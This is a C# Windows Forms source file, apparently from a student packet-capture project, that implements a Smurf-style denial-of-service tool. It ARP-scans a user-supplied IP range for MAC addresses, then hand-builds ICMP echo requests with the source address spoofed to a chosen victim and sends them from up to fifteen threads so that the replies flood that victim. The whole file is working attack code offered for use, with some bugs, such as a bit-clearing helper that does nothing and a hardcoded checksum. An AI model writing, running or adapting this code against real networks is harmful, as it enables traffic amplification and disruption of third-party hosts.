using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Net.NetworkInformation;
using IpRanges;
using System.Threading;
using SharpPcap;
using PacketDotNet;
using System.Diagnostics;
using System.Net.Sockets;

namespace MyPacketCapturer
{
    public partial class frmSmurf : Form
    {
        public static int instantiations = 0;
        string results = "";
        Dictionary<IPAddress, string> macList = new Dictionary<IPAddress, string>();
        IPAddress tempIP = new IPAddress(0);
        Boolean congest = false;

        public frmSmurf()
        {
            InitializeComponent();
            instantiations++;
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            //do checks that is an ip address
            try
            {
                //get mac and replace spaces and ':'
                var MAC = txtMAC.Text;
                MAC = MAC.Replace(" ", String.Empty);
                MAC = MAC.Replace(":", String.Empty);

                var ipAttack = IPAddress.Parse(txtAttackIp.Text);
                IPRange range = new IPRange(txtRangeIP.Text);

                //get all the ips
                List<IPAddress> ips = range.GetAllIP();

                foreach (IPAddress t in ips)
                {
                    //get the mac of the attacking ips
                    ARPMAC(t);
                }

                var newIps = macList.Keys;
                ips = newIps.ToList();

                //break them up for the threads
                int size = ips.Count;
                IEnumerator<IPAddress> x = ips.GetEnumerator();

                if (size < 3)
                {
                    smurfThread(ips, ipAttack, MAC);
                    smurfThread(ips, ipAttack, MAC);
                }
                else if (size > 10000)
                {
                    List<IPAddress> ip1 = new List<IPAddress>();
                    List<IPAddress> ip2 = new List<IPAddress>();
                    List<IPAddress> ip3 = new List<IPAddress>();
                    List<IPAddress> ip4 = new List<IPAddress>();
                    List<IPAddress> ip5 = new List<IPAddress>();
                    List<IPAddress> ip6 = new List<IPAddress>();
                    List<IPAddress> ip7 = new List<IPAddress>();
                    List<IPAddress> ip8 = new List<IPAddress>();
                    List<IPAddress> ip9 = new List<IPAddress>();
                    List<IPAddress> ip10 = new List<IPAddress>();
                    int g = 0;
                    for (int i = 0; i < size; i++)
                    {
                        if (g == 10) { g = 0; } 
                        if (g == 0)
                        {
                            ip1.Add(x.Current);
                            x.MoveNext();
                        }
                        else if (g == 1)
                        {
                            ip2.Add(x.Current);
                            x.MoveNext();
                        }
                        else if (g == 2)
                        {
                            ip3.Add(x.Current);
                            x.MoveNext();
                        }
                        else if (g == 3)
                        {
                            ip4.Add(x.Current);
                            x.MoveNext();
                        }
                        else if (g == 4)
                        {
                            ip5.Add(x.Current);
                            x.MoveNext();
                        }
                        else if (g == 5)
                        {
                            ip6.Add(x.Current);
                            x.MoveNext();
                        }
                        else if (g == 6)
                        {
                            ip7.Add(x.Current);
                            x.MoveNext();
                        }
                        else if (g == 7)
                        {
                            ip8.Add(x.Current);
                            x.MoveNext();
                        }
                        else if (g == 8)
                        {
                            ip9.Add(x.Current);
                            x.MoveNext();
                        }
                        else if (g == 9)
                        {
                            ip10.Add(x.Current);
                            x.MoveNext();
                        }
                        g++;
                    }

                    //build three threads for each list we split
                    Thread t1 = new Thread(() => smurfThread(ip1, ipAttack, MAC));
                    Thread t2 = new Thread(() => smurfThread(ip2, ipAttack, MAC));
                    Thread t3 = new Thread(() => smurfThread(ip3, ipAttack, MAC));
                    Thread t4 = new Thread(() => smurfThread(ip4, ipAttack, MAC));
                    Thread t5 = new Thread(() => smurfThread(ip5, ipAttack, MAC));
                    Thread t6 = new Thread(() => smurfThread(ip6, ipAttack, MAC));
                    Thread t7 = new Thread(() => smurfThread(ip7, ipAttack, MAC));
                    Thread t8 = new Thread(() => smurfThread(ip8, ipAttack, MAC));
                    Thread t9 = new Thread(() => smurfThread(ip9, ipAttack, MAC));
                    Thread t10 = new Thread(() => smurfThread(ip1, ipAttack, MAC));
                    Thread t11 = new Thread(() => smurfThread(ip2, ipAttack, MAC));
                    Thread t12 = new Thread(() => smurfThread(ip3, ipAttack, MAC));
                    Thread t13 = new Thread(() => smurfThread(ip4, ipAttack, MAC));
                    Thread t14 = new Thread(() => smurfThread(ip5, ipAttack, MAC));
                    Thread t15 = new Thread(() => smurfThread(ip6, ipAttack, MAC));

                    t1.Start();
                    t2.Start();
                    t3.Start();
                    t4.Start();
                    t5.Start();
                    t6.Start();
                    t7.Start();
                    t8.Start();
                    t9.Start();
                    t10.Start();
                    t11.Start();
                    t12.Start();
                    t13.Start();
                    t14.Start();
                    t15.Start();

                    //join them back
                    t1.Join();
                    t2.Join();
                    t3.Join();
                    t4.Join();
                    t5.Join();
                    t6.Join();
                    t7.Join();
                    t8.Join();
                    t9.Join();
                    t10.Join();
                    t11.Join();
                    t12.Join();
                    t13.Join();
                    t14.Join();
                    t15.Join();
                }
                else if (size % 2 == 0)
                {
                    List<IPAddress> ip1 = new List<IPAddress>();
                    List<IPAddress> ip2 = new List<IPAddress>();

                    for (int i = 0; i < size; i++)
                    {
                        if (i < (size / 2))
                        {
                            ip1.Add(x.Current);
                            x.MoveNext();
                        }
                        else if (i < size)
                        {
                            ip2.Add(x.Current);
                            x.MoveNext();
                        }
                    }

                    //build three threads for each list we split
                    Thread t1 = new Thread(() => smurfThread(ip1, ipAttack, MAC));
                    Thread t2 = new Thread(() => smurfThread(ip2, ipAttack, MAC));

                    t1.Start();
                    t2.Start();

                    //join them back
                    t1.Join();
                    t2.Join();
                }

                else if (size % 3 == 0)
                {
                    List<IPAddress> ip1 = new List<IPAddress>();
                    List<IPAddress> ip2 = new List<IPAddress>();
                    List<IPAddress> ip3 = new List<IPAddress>();
                    
                    for (int i = 0; i < size; i++)
                    {
                        if (i < (size / 3))
                        {
                            ip1.Add(x.Current);
                            x.MoveNext();
                        } else if (i < ((size / 3) * 2))
                        {
                            ip2.Add(x.Current);
                            x.MoveNext();
                        } else if (i < size)
                        {
                            ip3.Add(x.Current);
                            x.MoveNext();
                        }
                    }

                    //build three threads for each list we split
                    Thread t1 = new Thread(() => smurfThread(ip1, ipAttack, MAC));
                    Thread t2 = new Thread(() => smurfThread(ip2, ipAttack, MAC));
                    Thread t3 = new Thread(() => smurfThread(ip3, ipAttack, MAC));

                    t1.Start();
                    t2.Start();
                    t3.Start();

                    //join them back
                    t1.Join();
                    t2.Join();
                    t3.Join();

                }

                txtResults.Text = results;
                results = "";
            } catch (Exception ex)
            {
                txtResults.Text = ex.Message;
                //code for error
            }
        }

        private void ARPMAC(IPAddress SrcIp)
        {
            byte[] packet = new byte[42];
            for (int i = 0; i < 6; i++)
            {
                packet[i] = Convert.ToByte("ff", 16);
            }
            //get current machines MAC
            string myMAC =
            (
                from nic in NetworkInterface.GetAllNetworkInterfaces()
                where nic.OperationalStatus == OperationalStatus.Up
                select nic.GetPhysicalAddress().ToString()
            ).FirstOrDefault();

            //convert mac address
            int g = 0;
            char[] mac = myMAC.ToCharArray();
            for (int i = 6; i < 12; i++)
            {
                string t = mac[g].ToString() + mac[g + 1].ToString();
                packet[i] = Convert.ToByte(t, 16);
                t = packet[i].ToString("X2");
                g += 2;
            }
            //some set values we know
            packet[12] = Convert.ToByte("08", 16);
            packet[13] = Convert.ToByte("06", 16);
            packet[14] = Convert.ToByte("00", 16);
            packet[15] = Convert.ToByte("01", 16);
            packet[16] = Convert.ToByte("08", 16);
            packet[17] = Convert.ToByte("00", 16);
            packet[18] = Convert.ToByte("06", 16);
            packet[19] = Convert.ToByte("04", 16);
            packet[20] = Convert.ToByte("00", 16); //start opcode
            packet[21] = Convert.ToByte("01", 16); //opcode

            //add the sender mac so that I can get the response
            g = 0;
            for (int i = 22; i < 27; i++)
            {
                string t = mac[g].ToString() + mac[g + 1].ToString();
                packet[i] = Convert.ToByte(t, 16);
                g += 2;
            }

            g = 28;
            //send ip
            byte[] ip = GetLocalIPAddress().GetAddressBytes();
            foreach (byte b in ip)
            {
                packet[g++] = b;
            }

            //target mac is 00 00 00 00 00 00
            packet[g++] = Convert.ToByte("00", 16);
            packet[g++] = Convert.ToByte("00", 16);
            packet[g++] = Convert.ToByte("00", 16);
            packet[g++] = Convert.ToByte("00", 16);
            packet[g++] = Convert.ToByte("00", 16);
            packet[g++] = Convert.ToByte("00", 16);

            //target ip
            ip = SrcIp.GetAddressBytes();
            tempIP = SrcIp;
            foreach (byte b in ip)
            {
                packet[g++] = b;
            }

            /*for (int i = 0; i < 12; i++)
            {
                packet[g++] = Convert.ToByte("00", 16);
            }*/

            try
            {

                //need to wait 5 seconds for a response... if no response then it does not exist
                frmCapture.device.OnPacketArrival += new PacketArrivalEventHandler(device_OnPacketArrival);

                frmCapture.device.Filter = "arp";
                frmCapture.device.StartCapture();
                // System.Threading.Thread.Sleep(500);
                frmCapture.device.SendPacket(packet);

                
                Stopwatch watch = new Stopwatch();
                watch.Start();
                
            
                while (watch.ElapsedMilliseconds < 400)
                {

                }
                watch.Stop();
                frmCapture.device.StopCapture();
                frmCapture.device.Filter = "";
                
            }
             catch (Exception exp)
            {
                txtResults.Text = exp.Message;
            }
        }

        private void device_OnPacketArrival(object sender, CaptureEventArgs packet)
        {
            // **** WILL I HAVE ISSUES WITH MULTIPLE THREADS CAPTURING PACKETS?? WILL EACH THREAD OVERWRITE THE mac string causing issues? 
            // Should I move the capturing to capture while threads are running ?

            //Array to store data
            byte[] data = packet.Packet.Data;

            //check opcode to see if it is a reply arp
            string opcode = data[21].ToString("X2");

            if(opcode.Equals("02"))
            {

                //get current machines
                string myMAC =
                (
                    from nic in NetworkInterface.GetAllNetworkInterfaces()
                    where nic.OperationalStatus == OperationalStatus.Up
                    select nic.GetPhysicalAddress().ToString()
                ).FirstOrDefault();

                //check the destination mac to make sure the reply was inteded for us
                char[] array = myMAC.ToCharArray();
                Boolean same = true;
                for (int i = 0; i < array.Count(); i++)
                {
                    if (array[i].ToString().Equals(data[i].ToString("X2")))
                    {
                        same = false;
                    }
                }
                string test = data[28].ToString() + "." + data[29].ToString() + "." + data[30].ToString() + "." + data[31].ToString();
                //check the sender ip to see if its the one we wanted
                if (!test.Equals(tempIP.ToString()))
                    same = false;

                //now we know its the reply we wanted 32 - 37 bytes is the mac we want 
                if (same)
                {
                    if (!macList.ContainsKey(tempIP))
                    macList.Add(tempIP, data[22].ToString("X2") + data[23].ToString("X2") + data[24].ToString("X2") + data[25].ToString("X2") + data[26].ToString("X2") + data[27].ToString("X2"));
                    //macList[tempIP] = data[22].ToString("X2") + data[23].ToString("X2") + data[24].ToString("X2") + data[25].ToString("X2") + data[26].ToString("X2") + data[27].ToString("X2");
                }

            }            
        }

        private void smurfThread (List<IPAddress> ips, IPAddress attack, string MAC)
        {

            System.Text.ASCIIEncoding encoding = new System.Text.ASCIIEncoding();

            //iterate thru the IP address range given to the thread
            foreach (IPAddress ip in ips)
            {
                if (ip == null) { continue; }
                //need to insert the destination MAC

                byte[] packet = new byte[74];

                //get the mac of the attacking ips
                string mac;
                macList.TryGetValue(ip, out mac);
                if (mac == null)
                {
                    results += "No MAC from IP: " + ip.ToString() + ", skipping....." + Environment.NewLine;
                    continue;
                }
                char[] ranMAC = mac.ToCharArray();
                int g = 0;
                //setting destination 
                for (int i = 0; i < ranMAC.Count(); i += 2)
                {
                    string t = "" + ranMAC[i] + ranMAC[i + 1];
                    packet[g] = Convert.ToByte(t, 16);
                    g++;
                }

               
                char[] array = MAC.ToCharArray();
                //setting source address or the comp we want the ping replies to go to
                for (int i = 0; i < array.Count(); i+=2)
                {
                    string t = "" + array[i] + array[i+1];
                    packet[g] = Convert.ToByte(t, 16);
                    g++;
                }

                //some set values we know
                packet[g++] = Convert.ToByte("08", 16);
                packet[g++] = Convert.ToByte("00", 16); 
                packet[g++] = Convert.ToByte("45", 16); 
                packet[g++] = Convert.ToByte("00", 16);
                packet[g++] = Convert.ToByte("00", 16);
                packet[g++] = Convert.ToByte("3c", 16);

                packet[g++] = Convert.ToByte(("" + ranMAC[0] + ranMAC[1]), 16); // identifier

                packet[g++] = Convert.ToByte(("" + ranMAC[2] + ranMAC[3]), 16); // identifier

                packet[g++] = Convert.ToByte("00", 16);
                packet[g++] = Convert.ToByte("00", 16);
                packet[g++] = Convert.ToByte("80", 16);
                packet[g++] = Convert.ToByte("01", 16);
                packet[g++] = Convert.ToByte("00", 16);
                packet[g++] = Convert.ToByte("00", 16);

                //packet to source address
               // byte[] packet2 = {Convert.ToByte("08", 16) , Convert.ToByte("00", 16), Convert.ToByte("45", 16), Convert.ToByte("00", 16), Convert.ToByte("00", 16),
                 //               Convert.ToByte("3c", 16), Convert.ToByte("4c", 16), Convert.ToByte("90", 16), Convert.ToByte("00", 16), Convert.ToByte("00", 16),
                   //             Convert.ToByte("80", 16), Convert.ToByte("01", 16), Convert.ToByte("00", 16), Convert.ToByte("00", 16)};

                //source address
                byte[] tPacket = attack.GetAddressBytes(); 

                foreach (byte b in tPacket)
                {
                    packet[g] = b;
                    g++;
                }


                // destination address
                tPacket = ip.GetAddressBytes();

                foreach (byte b in tPacket)
                {
                    packet[g] = b;
                    g++;
                }

                //some set values we know
                packet[g++] = Convert.ToByte("08", 16);
                packet[g++] = Convert.ToByte("00", 16);
                packet[g++] = Convert.ToByte("4d", 16); //checksum
                packet[g++] = Convert.ToByte("91", 16); //checksum
                packet[g++] = Convert.ToByte("00", 16);
                packet[g++] = Convert.ToByte("01", 16);
                packet[g++] = Convert.ToByte("00", 16);
                packet[g++] = Convert.ToByte("08", 16);
                packet[g++] = Convert.ToByte("61", 16);
                packet[g++] = Convert.ToByte("62", 16);
                packet[g++] = Convert.ToByte("63", 16);
                packet[g++] = Convert.ToByte("64", 16);
                packet[g++] = Convert.ToByte("65", 16);
                packet[g++] = Convert.ToByte("66", 16);
                packet[g++] = Convert.ToByte("67", 16);
                packet[g++] = Convert.ToByte("68", 16);
                packet[g++] = Convert.ToByte("69", 16);
                packet[g++] = Convert.ToByte("6a", 16);
                packet[g++] = Convert.ToByte("6b", 16);
                packet[g++] = Convert.ToByte("6c", 16);
                packet[g++] = Convert.ToByte("6d", 16);
                packet[g++] = Convert.ToByte("6e", 16);
                packet[g++] = Convert.ToByte("6f", 16);
                packet[g++] = Convert.ToByte("70", 16);
                packet[g++] = Convert.ToByte("71", 16);
                packet[g++] = Convert.ToByte("72", 16);
                packet[g++] = Convert.ToByte("73", 16);
                packet[g++] = Convert.ToByte("74", 16);
                packet[g++] = Convert.ToByte("75", 16);
                packet[g++] = Convert.ToByte("76", 16);
                packet[g++] = Convert.ToByte("77", 16);
                packet[g++] = Convert.ToByte("61", 16);
                packet[g++] = Convert.ToByte("62", 16);
                packet[g++] = Convert.ToByte("63", 16);
                packet[g++] = Convert.ToByte("64", 16);
                packet[g++] = Convert.ToByte("65", 16);
                packet[g++] = Convert.ToByte("66", 16);
                packet[g++] = Convert.ToByte("67", 16);
                packet[g++] = Convert.ToByte("68", 16);
                packet[g++] = Convert.ToByte("69", 16);

                //now we have the complete packet
                try
                {
                    frmCapture.device.SendPacket(packet);
                    results += "PING to IP: " + ip.ToString() + Environment.NewLine;
                }
                catch (Exception exp)
                {
                }
            }
        }

        public static string generateMACAddress()
        {
            var sBuilder = new StringBuilder();
            var r = new Random();
            int number;
            byte b;
            for (int i = 0; i < 6; i++)
            {
                number = r.Next(0, 255);
                b = Convert.ToByte(number);
                if (i == 0)
                {
                    b = setBit(b, 6); //--> set locally administered
                    b = unsetBit(b, 7); // --> set unicast 
                }
                sBuilder.Append(number.ToString("X2"));
            }
            return sBuilder.ToString().ToUpper();
        }

        private static byte setBit(byte b, int BitNumber)
        {
            if (BitNumber < 8 && BitNumber > -1)
            {
                return (byte)(b | (byte)(0x01 << BitNumber));
            }
            else
            {
                throw new InvalidOperationException(
                "The value for BitNumber " + BitNumber.ToString() + " was not in the allowed range. (BitNumber = (min)0 - (max)7)");
            }
        }

        private static byte unsetBit(byte b, int BitNumber)
        {
            if (BitNumber < 8 && BitNumber > -1)
            {
                return (byte)(b | (byte)(0x00 << BitNumber));
            }
            else
            {
                throw new InvalidOperationException(
                "The value for BitNumber " + BitNumber.ToString() + " was not in the allowed range. (BitNumber = (min)0 - (max)7)");
            }
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void label2_Click(object sender, EventArgs e)
        {

        }

        private void btnClear_Click(object sender, EventArgs e)
        {
            txtResults.Text = "";
        }

        public static IPAddress GetLocalIPAddress()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    return ip;
                }
            }
            throw new Exception("Local IP Address Not Found!");
        }

        private void chkCng_CheckedChanged(object sender, EventArgs e)
        {
            if (congest)
            {
                congest = false;
            } else
            {
                congest = true;
            }
        }
    }
}
